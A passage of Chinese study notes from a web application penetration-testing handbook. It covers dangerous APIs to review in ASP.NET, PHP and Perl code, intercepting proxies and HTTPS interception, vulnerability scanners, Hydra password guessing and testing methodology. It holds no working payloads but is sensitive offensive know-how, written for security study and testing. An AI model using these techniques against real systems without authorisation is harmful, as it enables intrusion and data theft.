Parameters 属性来创建使用参数占位符的查询语句； 动态代码ASP 通过 VBScript 可以接受动态代码，相关几个函数包括： Eval 函数：接受 VBScript 代码字符串； Execute 函数：接受 ASP 代码字符串； ExecuteGlobal 函数：接受 ASP 代码字符串； OS 命令执行 如果可以直接向 Start 传递字符串参数，或者通过 StartInfo 传递参数，则存在漏洞隐患。 即使仅能控制部分字符串，也有隐患： 另外通过 ProcessStartInfo 的 Arguments 属性，如果用户可以控制 Arguments 的参数，则虽然攻击者不能执行指定代码，但可以通过指定参数，影响命令的期望行为，例如下载恶意文件到主机的任意位置； 重定向 套接字System.Net.Sockets.Socket 类，漏洞利用方法跟 Java 平台一样； ASP.NET 环境配置环境配置参数放在 Web 根目录下的 web.config 文件中 PHP获取用户提交的数据PHP 使用一些内置变量来保存用户的请求数据 在处理用户的输入时，PHP 有一些特殊的用法： $GLOBALS 对象用来访问预先定义的全局变量； 如果配置项 register_globals 开启，则 PHP 会为每个请求参数建立全局变量，访问程序中的代码在各处实现访问请求参数，而无须传递这些请求参数；这会给代码审查增加一些额外的工作，因为对请求参数的引用，变得更加隐蔽了； $_SERVER 数据中可以访问用户提交的定制消息头； 如果请求参数中的某个参数名称包含索引引用，则该参数的值将被自动转换成对象类型； 会话交互 潜在的危险 API文件访问PHP 中读写文件的函数有很多个，其中一些还可以访问远程文件； 如果直接向上面这些函数传递拼接后的字符串，则将存在漏洞隐患； 另外还有一些函数用于执行 PHP 脚本，如果用户可以控制传递给它们的参数，则也非常危险； 访问远程文件的功能默认是打开的，可通过配置参数 allow_url_fopen 将其关闭；但是关闭后，仍然有几个方法可用于访问远程文件，PHP 在 5.2 以上版本引入了 allow_url_include 参数并默认将其关闭来避免上述漏洞； 数据库访问 以上函数直接接受字符串查询参数，易于受到攻击。下面几个函数则使用占位符的方式插入查询参数，相对安全； 动态代码 动态代码的多个语句使用分号进行分隔，如果用户可控制参数，则易于受到脚本注入攻击； 另外搜索替换功能的正则表达式函数 preg_replace，如果以 /e 选项调用，则会执行 PHP 代码；若用户可控制参数，则存在漏洞隐患； PHP 还接受函数名称做为变量，然后动态调用该函数；因此攻击者可以通过指定相应的参数名称，让 PHP 调用某些内置的敏感函数，如 phpinfo，获取与 PHP 运行时环境相关的信息； OS 命令执行 跟 JAVA, ASP 不同，PHP 的系统命令接口，接受 | 字符用来对多个命令进行连接，因此它非常危险；如果未对用户的输入进行过滤，意味着攻击者有机会执行任意的系统命令； 重定向 实现重定向有两种方法，一种直接使用 http_redirect API，另外一种是通过 setResponseCode 和 setHeaders； 套接字 通过 socket_create 函数可与任意的主机建立连接，无论是公共的因特网，还是私有网络上的任意主机；fsockopen 和 pfsockopen 函数在建立连接后，可返回一个标准文件指针，供 fwrite 和 fgets 等函数调用，从而实现两个主机之间的数据传输； 配置 PHP 环境PHP 配置参数放在 php.ini 文件中，它的内容结构和 windows ini 文件类似，里面有很多不安全的选项（新版本的 PHP 删除掉了很多问题选项）； 使用全局变量如果 redister_globals 选项被开启，则 PHP 会为每个请求参数建立全局变量；如果变量在使用前没有预先初始化一个值，那么攻击者就可以将某个变量设置为任意值，从而存在应用程序的逻辑； PHP 4.2 以上版本将 register_globals 设置为默认关闭了，并在 PHP 6 以下版本完全去除了该选项； 安全模式如果开启 safe_mode 模式，则某些危险的函数将被禁用，某些敏感函数的功能会受到一定的使用限制；例如： shell_exec 函数被禁用，原因：该函数可用于调用任意的操作系统命令； mail 函数的 additional_parameters 参数被禁用，原因：该参数存在 SMTP 注入漏洞； exec 函数仅限于执行 safe_mode_exec_dir 中指定的可执行程序，并且将转义命令行中的元字符； 虽然 safe_mode 限制了部分危险函数，但是由于它不可能限制所有的函数，因此攻击者仍然有机会通过其他函数曲线救国，实施攻击。因此在 PHP 6 以上的版本，安全模式已经被删除了； magic quotes当 magic quotes 选项被激活时，PHP 将转义请求参数中的任何单引号、双引号、反斜线和空格（即为它们添加一个反斜线）。该选项的目的是防范 SQL 注入攻击； 但事实上，这个功能的效果很有限，因为攻击者可以使用二阶攻击的方式来避开转义，另外在 SQL 中注入数字字段时，也不需要单引号。 更搞笑的是，某些数据的处理并不能添加转义，因此如果开启了 magic quotes 选项，则开发者还需要在源代码中，删除 PHP 添加的转义符，从而对请求参数做出一些原本并不需要的修改，导致出现混乱； 通常建议关闭该选项，因为它是针对所有请求参数的，太没有针对性了，很容易引入更多的麻烦。更好的做法是使用预处理语句，来安全的访问数据库； PHP 6 以上版本已经删除了该选项； 其他 PerlPerl 是一种非常灵活的语言，同一个任务，有很多种写法，这也意味着漏洞的敞口很大，尤其是在自主开发的模块中，部分没有经验的开发者有可能在其中引入一些危险的函数来执行任务。Perl Web 程序通常使用 CGI.pm 模块来构造（后面的内容围绕该模块展开，如果不是使用该模块，则相关功能的 API 需要另外查文档确定； 获取用户提交的数据 会话交互Perl 使用 CGISession.pm 模块来实现会话管理，写法如下： 潜在的危险 API文件访问 open 接受文件名参数，实现向指定文件写入或读取内容，因此如果用户可以控制文件名参数，则攻击者可以利用它来访问任意文件；更狠的是， open 还允许在参数中使用管道连接符 “|”，如果参数中包含管道符，则参数内容将被发送给 shell，因此攻击者可以利用它来执行任意的操作系统命令； 数据库查询 selectall_arrayref do 较安全的做法是使用包含占位符的语句，通过下面两个函数来实现： prepare execute 动态代码Perl 也使用 eval 函数来执行动态代码，同时使用分号作为分隔符，连接多个语句； OS 命令执行 system exec qx 反单引号 ` 以上函数都接受管道符，因此攻击者可以利用以上函数，执行任意的操作系统命令； 重定向 redirect：其参数可以是相对 URL，也可以是绝对 URL 的字符串； 套接字 socket：创建套接字 connect：建立连接 配置 Perl 环境相对于 PHP 使用安全模式，Perl 比较有意思，它使用污染模式，即默认用户的输入都是被污染和不安全的，如果有任意变量是基于用户的输入来赋值，那么该变量也会视为被污染的变量； 污染的变量无法作为一些标记为敏感函数的参数，如 eval、system、exec、open 等，需要使用正则表达式对污染变量进行净化后，才可以使用，示例如下： Perl 的污染模式相当于要求开发者强制对输入进行过滤，从某种程度来说，确实提高了开发者的安全意识； 虽然污染模式的初衷是很好的，但是它的安全防御效果，还取决于开发者能否写出正确有效的正则表达式，如果不行的话，仍然是存在漏洞隐患的； Javascript前端的 JS 代码无须任何权限，即可被用户查看。查看这部分代码有助于了解前端实施了哪些输入检查机制，以及动态生成的页面结构；有两个位置存在 JS 代码，一个是 js 文件，另外一个是嵌入在 HTML 中的 JS 代码； 主要的检查点为 DOM 操作以及对当前文档进行修改的 API； 数据库组件由于数据库软件变得越来越强大，因此它的功能已经不再局限于存储数据，而是围绕存储目标，进行了强大的扩展和增强，因此也经常被用于执行一定程度的业务逻辑。这些扩展的功能包括：存储过程、触发器、自定义函数等；因此，在审查源代码时，也有必要同时审查写在数据库组件中的代码； 数据库组件的安全隐患，从本质上来说，跟其他语言并没有区别，只是语法稍有不同而已，常见的漏洞仍然为下面两类： 存在 SQL 注入漏洞； 使用用户参数，调用敏感函数 SQL 注入除了在业务源代码层面排除注入隐患外，还需要检查存储过程，因为有些隐患发生在这些地方，示例如下： 不同的数据库软件，其动态执行 SQL 语句的命令不同，常见数据库及其命令名称如下： 调用危险的函数数据库本质上是一个软件，运行的时候，它自己即是一个进程，因此它具有所有进程都会拥有的功能，可以在权限范围内执行任意的系统命令。为了增强数据库本身的功能，它开放了一部分接口供开发者在存储过程中调用，这在带来方便的同时，也引入了安全隐患；攻击者可以利用它来执行任意的操作系统命令； 代码浏览工具为了完成源代码的审查，不可避免需要实现大量搜索、跳转等动作，因此，使用一个支持多种语言的源码浏览软件，会提高很多效率，常见的有 Visual Studio、NetBeans 和 Eclipse 等。作者在此处推荐了一个以前没听说的，叫 Source Insight，估计是专门针对这个场景进行开发和优化的； 20. Web 应用程序工具包理论上只需要一个浏览器就可以发起 Web 攻击，不过这样做显示效率不高，因为浏览器毕竟是作为普通用户浏览 Web 网站的场景而开发的，因此更高效的做法是开发额外的工具，将它放在浏览器和目标应用程序之间，拦截浏览器和应用程序之间的请求和响应，根据需要修改请求和读取响应，实现预期的目标。 第二类工具是基于常见的漏洞特征，自动对目标应用程序进行扫描，寻找是否存在潜在的漏洞。第三类工具是针对某种特定的漏洞执行特定的任务，这类工具使用的频率比较低，但由于它是针对性开发，因此在针对特定问题上，其效果非常好。 Web 浏览器不的浏览器厂家，其开发的浏览器功能和配置有所不同，因此在使用它们进行攻击时，需要了解并利用它们不同的特性，来提高攻击的效率； Internet Explorer虽然 IE 浏览器已经非常古老了，但令人遗憾的是，目前它仍然在世界上占据一定的市场份额，它只能运行在 Windows 平台上，而且也只有它支持 ActiveX 控件。 截止 2021-5-1，网上查到的各浏览器市场份额如下： IE 8 引入了反 XSS 功能，并且默认开启，因此在探查 XSS 漏洞时，需要先将其关闭。待找到漏洞后，再将其打开，如果需要，可进一步规避该漏洞的办法； 以下两个 IE 扩展可协助攻击 Web 应用程序： HttpWatch：用于分析所有的 HTTP 请求和响应； IEWatch：功能与 HttpWatch 类似，另外还可用于分析 HTTP 文档、图像和脚本等； Firefox由于每个浏览器的特性不同，因此针对 IE 无效的 XSS 攻击，可能在 Firefox 有效。以下是常见的攻击辅助扩展： HttpWatch：同样可用于 Firefox FoxyProxy：设置浏览器的代理，可快速切换代理，并为不同的 URL 设置不同的代理； LiveHTTPHeader：修改消息头； PrefBar：启用禁用 cookie、检查访问控制、切换代理、清除缓存； Wappalyzer：确定页面技术栈； WebDeveloper 工具栏：查看所有页面链接、更改页面 HTML、取消表单长度限制、显示隐藏的表单字段、修改请求方法； Chrome XSS Rays：XSS 漏洞和 DOM 漏洞测试； cookie 编辑器 Wappalyzer WebDeveloper 测试集成工具早期的工具是 Achilles，虽然功能简单，但有经验的攻击者可用它实现攻击。当前各常用工具如下： 每种套件的侧重点有所不同，建议多尝试几种，再从中选择一两个合适的； 工作原理各个套件的原理大同小异，它内部一般由多个功能模块组成，不同的模块共享相同的请求和响应数据；它会拦截监控浏览器的请求和响应，并保存与应用程序相关的信息，并配套各种不同的功能对这些信息进行读取或修改；其核心组件一般包括： 拦截器代理拦截是各集成测试软件的核心功能。为了实现拦截，需要先配置浏览器中的代理服务器选项，让浏览器与指定的本地端口发生通信；之后浏览器所有的请求都会发往该端口（实质上该端口即是操作系统为套件分配的端口，当浏览器向该端口发送请求时，请求的数据将由操作系统转发给套件进程进行处理，之后套件转发请求到因特网，并在收到应用程序的响应后，再根据需要转发给浏览器）； 配置浏览器大多数浏览器都有使用代理服务的选项，只要按照文档，简单的设置一下就搞定了。 有些应用程序使用厚客户端，并不在浏览器中运行，而是由客户端直接访问硬编码的域名，因此常规的浏览器代理设置行不通。针对这种情况，有一个简单的解决办法是修改操作系统的 hosts 文件，它在操作系统层面，将指定域名解析到指定的 IP 地址； 虽然修改 hosts 可以解析域名问题，但是端口指定不了，因此接下来还需要配置攻击套件监听 80 和 443 端口，并让端口支持匿名代理功能（开启匿名代理后，发往该端口的非代理请求，将强制被重定向）； 为了避免代理 HTTPS 请求遇到 SSL 证书错误的问题，还需要将匿名代理服务器配置为特定域名的 SSL 证书； 配置套件选项，让其将特定主机名解析为其原始的 IP 地址，以覆盖本地主机的 DNS 解析，使其转发出的请求能够被发送正确的目标服务器（不然会被主机的 hosts 设置再转发回给自己）； 攻击套件需要用到请求中的 Host 字段，来实现转发功能。如果请求中没有 Host 字段，就需要手工预设了。如果应用程序只一个目标主机名还好说，如果有多个，就有点蛋疼了。此时需要在多个机器上运行多个套件实例，来模拟不同的远程主机名；每个实例负责转发一个特定的主机名； 拦截代理服务器与 HTTPS 当开启浏览器中的代理选项后，浏览器发出的请求跟普通请求略有不同，据说是代理格式的请求，之后需要由拦截器转换成非代理的请求，再发送给目标服务器；好奇代理格式的请求的不同点在哪些 对于 HTTPS 连接，普通的代理服务器将通过建立和保持 connect 连接，来扮演请求中继的功能，浏览器将直接和目标服务器建立 SSL 握手，这意味着代理服务器并无法知道通过 HTTPS 加密传输的内容。因此，拦截服务器并不能以中继的模式工作，不然无法起到拦截的作用。而是要扮演中间商的作用，分别与浏览器和目标服务器建立两个独立的 SSL 握手，浏览器与目标服务器之间则不发生直接的接触； 当通过浏览器向目标域名发起请求，收到的却是拦截器提供的 SSL 证书时，浏览器会出现警告弹窗，询问用户是否信任该证书，由于攻击者即是用户本人，因此攻击者可以完全控制浏览器并点击接受。 但接下来会遇到一个问题，目标服务器返回的响应内容中，很有可能携带指向第三方域名的链接，例如引用图片、视频等，而这些第三方域名很可能也是使用 HTTPS 进行访问的；当浏览器向这些第三方域名发起请求时，收到的却是拦截器提供的证书，此时浏览器很可能不再会出现弹窗，询问用户是否接受，而是直接丢弃该请求，并显示一条警告。 另外，当不使用浏览器，而是使用厚客户端向目标服务器发起请求时，厚客户端也很有可能不会相信拦截器的 SSL 证书。 要解决以上问题，关键是要回到问题的原点，即了解一个证书能否被信任，它的过程是怎样发生的。事实上，出于安全和实用的考虑，每个操作系统在出厂的时候，都预安装了一些第三方 CA 机构的根证书。之后各种 SSL 的校验，其实都是通过证书链，最终推导到这些根证书来进行验证的。因此，只要在操作系统中，将自己生成的证书，添加成可信用的 CA 机构，那么由该证书签名的其他证书，就会变成可信的了； 共同特性围绕拦截这个基本功能，集成工具一般还配备了高效的辅助工具包，包括： 详细的拦截规则：通过设置规则，只拦截满足规则的请求或响应，提高测试效率； 完整的请求和响应记录：可根据需要，将记录转发给其他模块进一步分析处理；并可检索过滤满足特定条件的记录，快速定位； 对请求和响应进行自动匹配和替换：例如自动修改某个参数，修改 cookie 值，删除缓存、修改消息头等； 修改 HTTP 消息格式：例如切换不同的内容编码； 修改 HTML：如显示隐藏表单字段、删除输入限制、删除 JS 检查； 爬虫相对于静态页面爬虫，Web 应用程序的爬虫要复杂一点，因为它要处理很多动态生成的东西，并且功能之间经常有顺序要求。使用爬虫的目的在于获取所有关于目标应用程序的功能和内容，以便为下一步的分析做好准备。配合手工浏览，爬虫可以协助发现更多的内容，并将内容获取过程自动化，提高效率，实现彻底搜索； 常用功能如下： 自动构建网站地图； 精准爬取指定内容：通过设置规则，准确抓取某一部分指定的内容；避免抓取一些无关的内容，或者访问一些敏感功能，导致出现不可逆的破坏，或者会话终止； 自动解析内容：如 HTML 表单、脚本、注释、图像等，之后可在站点地图中便捷的分析它们； 解析 JS 代码，从中发现动态的 URL 和资源； 根据预设置参数，自动提交表单； 自定义无效资源的规则，让网站地图的构建更加精准（因为有些服务器即使请求的资源无效，也会返回 200 状态）； 通过检查 robots 文件来发现隐藏的资源； 根据枚举的目录，自动抓取里面的内容（即使这些内容链接并没有出现在响应中）； 自动获取和使用 cookie； 自动测试每个页面的 cookie 依赖性； 自动设置正确的 Referer 消息头（因为有些服务端会使用该消息头判断请求是否由人而非机器发起）； 可自定义任意的消息头； 控制自动抓取的速度和顺序，避免请求过快导致服务器崩溃，并让抓取的行为更加隐蔽； 测试器自动化工具可以提高测试的效率，集成工具通常包含如下常用的功能： 常见漏洞扫描的自定义配置； 内置攻击荷载和自定义函数，可根据自定义选项，自动生成任意的有效荷载； 保存扫描数据，可用于生成报告，也可传递给其他模块使用； 可自定义响应查看条件，例如根据表达式，筛选出满足条件的响应； 从响应中提取有用的数据，例如提取用户名和密码，供后续其他攻击使用； 扫描器扫描器一般包含两类扫描功能： 被动扫描：监控浏览器的请求和响应内容，分析是否存在常见的漏洞，如明文密码、cookie 配置错误、跨域 Referer 泄露等； 主动扫描：向目标程序发起攻击荷载，探查潜在漏洞，例如跨站点脚本漏洞、HTTP 消息头注入、文件遍历漏洞等；此类扫描对应用程序有一定的破坏性，可能引起应用程序故障； 扫描器的使用方法： 在手动解析应用程序的内容后，从生成的站点地图中选择感兴趣的部分，然后用扫描器对其进行扫描，这样可以提高效率，了解关键区域存在漏洞的可能性； 当手动测试单个请求时，可以配合扫描器一起使用。通过扫描器检查该请求是否存在常见漏洞； 在通过爬虫抓取整个程序后，使用扫描器扫描所有内容，类似独立的 Web 扫描器； 在浏览目标程序时，可以 Burp Suite 中开启实时扫描功能。这样借助浏览动作，将需要扫描的请求，实时的发给扫描器，而不必再额外手动进行配置； 虽然集成工具的扫描器的设计用途与独立扫描器不同，但事实上它的核心功能很强大，能够完成更多事情； 手动请求工具当需要对某个资源或接口进行深入探查时，我们一般会切换到手动的模式，此时需要对同一个资源或接口重复发布请求，但每个请求之间的内容有所区别。此时就会需要用到手动请求工具，来提高效率 这方面也有一些独立的工具，例如 Netcat，但一般集成套件也会有集成；集成后更加方便，当使用其模块进行初步探查中，再从中挑选感兴趣的部分，进一步进行深入的探查；探查的过程中，还可以利用其他模块共享的一些功能，例如 HTML 呈现、下游代理、验证、自定义消息头等； 手动请求的常用功能： 与其他模块配合，相互传递请求和数据； 保存所有请求和响应的历史记录，方便进入深入分析； 支持选项卡展示，可一次性处理多个不同的请求； 自动跟踪重定向； 会话令牌分析器会话令牌理想状态下应该是随机生成的，但是有些 Web 应用程序并没有做到这点。会话令牌分析器（Burp 中的 Sequencer）会基于样本对随机程度进行判断； 共享功能与实用工具 自动解析 HTTP 消息结构，例如消息头、请求参数等； 自动解析各种序列化的数据； 自动渲染 HTML 内容，就像在浏览器中查看一样； 支持以文本和十六进制格式编辑和显示消息； 支持对请求和响应内容的搜索； 编辑请求后，自动更新 Content-Length 属性； 内置编码器和解码器，可对请求和响应中的内容进行自动化解码或编码； 自动比对两个响应之间的不同之处，并突出显示； 自动化分析和发现易攻击面； 支持持久化保存会话数据； 支持下游代理和 SOCKS 代理； 内置 HTTP 验证方法； 支持客户端的 SSL 证书； 支持更深入的处理 HTTP 属性，例如 gzip 内容编码、块传输编码、状态码等； 支持使用第三方的插件对内置功能进行扩展； 常规任务自动化，例如自动爬取、扫描等； 支持持久化保存选项配置； 平台独立性； 测试工作流程典型的测试工作流程如下： 基本思路： 先解析应用程序的所有功能和请求，形成访问的历史记录和站点地图； 从历史记录或站点地图中，挑选最有可能存在漏洞的功能，发送给特定的模块，进行测试；例如将输入功能发给模糊测试、将令牌发给令牌分析器、使用 Repeater 对某个资源重复发送请求，检查漏洞是否存在等； 找到漏洞后，再回到浏览器检查漏洞是否被触发了，例如跨站点脚本是否注入成功，并会在浏览器触发执行等、SQL 注入成功，浏览器是否显示 SQL 的查询结果等； 测试人员不应该局限于上面的基本思路，可以发挥创意，尝试更多的测试办法，各种模块的组合，甚至还可以引入新的测试工具； 拦截代理服务器替代工具使用拦截代理服务器会导致浏览器和目标应用程序之间的通信被中断，有时候这种中断会导致部分应用程序的功能不可用，导致测试无法进行。此时只能去掉代理服务器，直接使用浏览器跟服务器进行通信，但是通过安装浏览器扩展，我们仍然能够完全控制浏览器发出的任意请求。 虽然扩展可以控制任意的请求，但是它的缺点是只能手动操作，可能也缺少自动抓取、模糊测试、漏洞扫描等功能；当然，如果可以的话，自己编写浏览器扩展是可以解决以上问题； 常用的浏览器扩展示例如下，测试员应该多多搜索和试用，并挑选最合适的工具： Tamper DataFirefox 扩展，当浏览器尝试提交表单时，它会进行拦截，并跳出弹窗，显示发送的报头和参数，可根据需要进行修改； TamperIETamper Data 的 IE 版本，功能相同； 独立漏洞扫描器独立漏洞扫描器的好处在于可以快速发现应用程序是否存在常用的漏洞。在收集完应用程序的功能和站点地图后，扫描就会针对各个功能发起各种攻击请求，并自动分析响应内容，从中查找漏洞存在的关键特征，之后生成一份漏洞报告。 扫描器探测到的漏洞有些漏洞有非常明显的特征，通过扫描器可以非常可靠的探测到。有时候，在应用程序的请求和响应中，自带这些特征。当发现这些特征后，扫描器就会有针对性的发送一个攻击荷载，看漏洞是否会被触发，如果会的话，扫描器就会将漏洞记录到报告中； 扫描器可以探测到的常见漏洞有： 反射型跨站点脚本漏洞：此时用户提交的输入未被检查或净化，可直接在响应中返回； SQL 注入漏洞：提交单引号会导致响应返回 ODBC 错误；或者提交特定字符串，会导致响应的时间延迟； 路径遍历漏洞：提交对某个已知文件的请求，然后看响应中是否出现该文件内容； 命令注入漏洞：提交注入导致响应延迟，或者某个特殊内容可以在响应中出现； 目录列表：提交目录请求，从响应中查看是否有目录列表； 明文密码、cookie、开启自动完成表单：直接通过检查请求和响应内容即可初步判断； 信息泄露：提交不同文件扩展名的枚举资源请求，检查是否存在未在链接中公开的文件和数据； 不过漏洞扫描器也不是万能的，它也存在很多的局限性，只要开发者对稍加注意，扫描器经常就无法在响应中发现漏洞特征，以下是一些扫描器难以准确判断的漏洞： 访问控制漏洞：此类漏洞可导致 A 用户访问 B 用户的数据，甚至是管理员的功能； 参数修改：扫描器无法预知修改某个参数，在逻辑上可能给应用程序带来的影响； 逻辑错误：例如提交负值，破坏计算逻辑；或者省略请求，跳过应用程序的检查步骤； 设计漏洞：例如低安全的密码，可通过枚举猜测； 会话劫持：攻击者通过猜测的会话令牌，假装另外一名用户登录； 敏感信息泄露：用户名列表、日志等； 虽然扫描器很有用，但是不能仅仅依赖它，因为有些漏洞它难以探查出来。在扫描器的基础上，应该多进一步分析； 扫描器限制虽然扫描器是专门研究 Web 应用程序漏洞的专家的所设计，但它仍然不可避免存在一些目前技术难以克服的先天限制，主要原因如下： Web 应用程序不是一种标准的程序，每个 Web 应用程序要解决的问题各不相同，因此写出来的代码千差万别，这也决定了其包含的漏洞形式和位置千差万别；相同的错误代码，却可能包含不同的错误消息，代表不同的含义。扫描器目前还无法像人类一样理解这些消息背后的真正含义，并做出下一步合理的行动。 针对某个应用程序的特殊异常表现，扫描器无法针对该异常做出有创造性的处理，它只能使用写好的既定步骤，完成标准的行为。扫描器只能按既定规则，蛮力提交大量请求。它无法从一堆响应中，找出最佳的攻击办法，例如根据多阶段步骤设计专门的输入、调整请求的顺序、在不同的步骤中传递消息等； 扫描器技术挑战 在扫描器自动化运行的过程中，有可能因为提交了某个请求，导致会话退出，此时有些扫描器无法自动重新登录，可能会导致部分漏洞被错过； 危险性：某些提交给应用程序的请求可能需要极大的破坏性，有可能直接导致应用程序崩溃，或者数据库的数据丢失； 扫描器一般将不同的链接理解为不同的内容，但事实上要测试的是功能，同一个功能，可能包含海量的链接，例如购物网站的商品链接，日历应用的日期链接等； 状态化处理：Web 应用程序的一个趋势是越来越多的保留大量状态在客户端，某个功能的完成，需要基于客户端的状态信息来完成； 避开应用程序的防御措施，例如出现异常立即终止会话、CAPTHA、二次验证等； 主流产品目前市场上主流的漏洞扫描器产品包括： Acunetix AppScan Burp Scanner Hailstorm NetSparker N-Stalker NTOSpider Skifish WebInspect w3af 大部分扫描器是收费的，少数是免费的，有趣的是，价格跟性能之间并没有直接关系。价格更高的不一定代表更好，价格低也不意味着性能不好 扫描器使用漏洞扫描器的好处是可以在最少的时间内，发现最多的漏洞，但最多一般也不会超过常见漏洞的 50%；这意味着它主要使用在以下场景中： 时间紧迫，需要尽快给出结果； 时间不紧迫，可基于该结果做为后续详细探查的参考； 使用时的注意事项： 了解扫描器能够发现的漏洞类型，以及它不能够发现的漏洞类型；（知其为，知其不可为） 熟悉扫描器的功能，知道如何进行配置，能够实现有效的扫描； 在扫描之前，先全面了解应用程序，以便更有针对性的利用扫描器的功能；（知已知彼，百战不殆） 了解抓取功能和全自动探查潜在的危险； 手动核实扫描报告中的所有潜在漏洞； 扫描器会在服务器和 IDS 防御中留下大量的“指纹”，如果要保持隐秘，则不要使用扫描器； 除非是对渗透测试不了解的用户，或者需要在短时间内处理大量的应用程序安全评估，不然一般不使用全自动的扫描。更好的做法是手动和自动的结合，通过手动在浏览器中访问目标 Web 应用程序，来指导扫描器的工作，这样好处多多，例如不容易遗漏关键的功能区域、避开危险功能、避开重复功能、处理可能遇到困难的输入确认、避免会话中断、正确处理多阶段的状态等； 其他工具除了主流的渗透测试工具外，还有很多其他工具可以处理一些不常见的特殊任务，以下仅包含一些常用的，当遇到其他场景时，应该上网搜索并尝试更多更好的工具。 Wikto/NiktoNikto 主要用来探查服务器上是否存在一些常见的第三方内容，它的工作原理很简单，就是先收集市面上各种普通使用的第三方内容，形成自己的数据库，然后基于该数据库，提出对应的请求，分析响应内容，从中找出关键特征，确认第三方内容是否存在；它的数据库会不断频繁的更新，以跟进最新的动态，因此比集成渗透工具要覆盖的多； 另外根据应用程序的自定义义行为，Nikto 允许对其分析功能进行配置，避免一些误警报； Wikto 是 Nikto 的 Windows 版本； FirebugFirebug 是在浏览器中使用的工具，通过它可以任意的修改 HTML 页面上的标签内容和脚本（可能有点像油猴）；它主要用来分析和实现针对客户端的攻击，例如跨站点脚本、请求伪造、UI 伪装、跨域数据捕获攻击等； HydraHydra 是一个密码猜测工具，根据用户提供的用户名列表、URL 链接、线程数量等，它会生成大量的请求，然后根据响应判断密码是否猜测正确； 定制脚本一般情况下，使用通用工具，可以完成大多数的渗透测试任务。但在少数情况下，可能需要通过编写定制化的脚本，来解决特定的问题，常用场景如下： 应用程序使用会话机制比较特别，例如：提交页面令牌有先后顺序要求； 某个漏洞，需要重复执行多个特定动作后，才会暴露出来； 会话终止后，需要通过非标准步骤重新建立会话； 解决以上问题的办法，就是自己编写一段脚本来提示请求和处理响应，以完成特定的功能。有好的是，套件工具可能提供插件接口，可以将脚本集成到测试套件中（例如 Burp 的 Extender、WebScarab 的 Bean Shell）； 除了脚本本身可用的内置命令和第三方库以外，还可以调用操作系统 shell 中的工具，例如： Wget：通过 HTTP(S) 访问某个给定的 URL；它支持很多选项参数，例如：代理服务器、HTTP 验证等； curl：用于提交 HTTP(S) 请求，同样支持很多选项参数，例如：不同的请求方法、请求参数、SSL 证书、HTTP 验证等； netcat：主要用来处理与网络有关的任务，同样可以创建 TCP 连接，发送请求并处理响应；更有趣的是，它可以用来在本地创建一个监听器，接收来自其他计算机的连接请求（netcat 不支持 SSL 连接，但可以通过和其他工具配合使用来实现 SSL 连接）； stunnel：它最核心的功能就是用来辅助建立 SSL 连接，即可以用在 netcat 上，也可以用在自定义脚本上；它的工作原理其实也不复杂，就是扮演代理服务器的作用，先监听某个本地端口，当收到发送到这个端口的请求后，再转成 SSL 转发请求到目标服务器； 小结通过工具，可以极大的提高测试的效率。没有最好的工具，只有最合适的工具。 21. 渗透测试方法论通过抽象的方法论，能够更好的指导实践。渗透测试需要探查的区域可以总结如下： 虽然从这张图看上去，各个攻击面之间好像有先后顺序，但其实并没有。完全可以利用在某个阶段发现有用的信息后，再返回上一个阶段重新进行攻击测试；例如通过访问控制漏洞，获得用户列表后，就可以基于该列表实施更加有针对性的密码猜测攻击； 在某个功能中发现的漏洞，对当前功能可能并没有什么危害，但是却可以被利用它进行其他功能的攻击。例如通过文件泄露漏洞获得源代码，然后可以直接进行代码审查，提高漏洞探查的效率； 某个漏洞的探查结果，可以帮助其他环节提高探查效率（因为很可能在程序内部，函数之间存在复用），例如同一个输入过滤程序，很可能使用在不同的功能模块中；当发现某种输入过滤的漏洞后，就有可能极大的提高其他环节的漏洞探查效率，设计有针对性的攻击荷载，直接避开过滤； 注意事项务必牢记的注意事项： 转义部分字符在 HTTP 请求中，具有特殊的意义，而且出现在不同的位置时，可能意义不同；因为如果在请求中出现这些字符时，需要给它们进行 URL 编码，以确保它们能够被正确的识别和发送； &，用于在查询字符串和消息主体中分隔参数，字面量需要编码为 %26 =，用于在查询字符串和消息主体中连接参数键值对，字面量需要编码为 %3d ?， 用于在查询字符串中标记参数的起始位置，字面量需要编码为 %3f 空格，用于在请求的第一行标记 URL 结束，也用于在 Cookies 消息头中表示一个 cookie 值的结束；字面量需要编码为 %20 或者 + +，表示空格，字面量需要编码为 %2b ;，用于在 cookie 消息头中分隔多个 cookie 值，字面量需要编码为 %3b #，用于在 URL 中标记片段名称的起始位置，如果在 URL 中插入这个字符，URL 将被截短为插入位置前面的部分，后面的部分转换成片段标识；字面量需要编码为 %23 %，用于标记 URL 编码的起始位置，字面量需要编码为 %25 空字节，字面量需要编码为 %00 换行符，字面量需要编码为 %0a 二次转义浏览器通常会对表单中提交的数据进行 URL 编码，因为如果在表单中输入已经编码过的值，则很可能会导致二次编码，最好在拦截代理服务器中查看核定一下最终结果； 假阳性有时候良性请求，也会导致响应中出现漏洞特征，导致扫描器误以为存在漏洞。此时需要分别提交良性和攻击两种请求，看响应是否有所区别，以确定漏洞真实存在，而不是误报（假阳性）； 隔离扫描器通常会对某个接口发送多个请求，导致它出现了多种状态。它下一个请求可能需要在某个特定的状态下，才能继续，因此上一个请求的多种状态，会导致下一个请求无法正常进行。解决办法是可以换个浏览器建立新会话，提交良性请求导致到目标位置，提交攻击请求，然后观察是否出现异常的响应；当然，如果不想另开浏览器，也可以通过修改 cookie 值和缓存信息进行调整；或者，也可以使用 Burp Reapter 工具隔离请求，让每个请求的状态不会相互影响 负载均衡有些应用程序很可能使用负载均衡，后端可能存在不止一台服务器，因此某个攻击请求造成的影响，可能仅限于某台服务器；当下一个验证请求恰好没有到达该服务器时，可能会误以为攻击没有成功；解决办法是多次提交验证请求，直到请求被转发到目标服务器，验证攻击是否成功； 解析应用程序内容 搜索可见的内容 配置浏览器，使用代理服务器或爬虫工具，例如使用 Burp 和 WebScarab 监控并被动抓取代理服务器拦截的内容； 如果需要，除了从代理服务器入手外，也可以从浏览器入手；可以考虑安装浏览器扩展，例如 IEWatch，监控分析浏览器处理的 HTTP 和 HTML 内容； 以常规的方式，浏览整个应用程序，包括发现的每一个链接、提交每一个表单、完成多阶段功能；同时尝试在禁用 javascript 或 cookie 的状态下进行浏览；原因：针对不同内容和不同的浏览器设置，应用程序内部可能有相应的处理逻辑； 如果可以创建或者拥有登录账户，则访问所有被保护的功能； 在浏览过程中，留意客户端的代码如何对服务端返回的内容进行处理； 查看自动生成的站点地图，看是否包含未被手动浏览访问的链接或功能；例如可以使用 Burp Spider 中的 Linked From 功能，了解每项内容是从何处链接过来的；然后访问这些来源链接，向上追溯，以期找到更多的内容；反复递归使用这个方法，直到无法发现任何新内容； 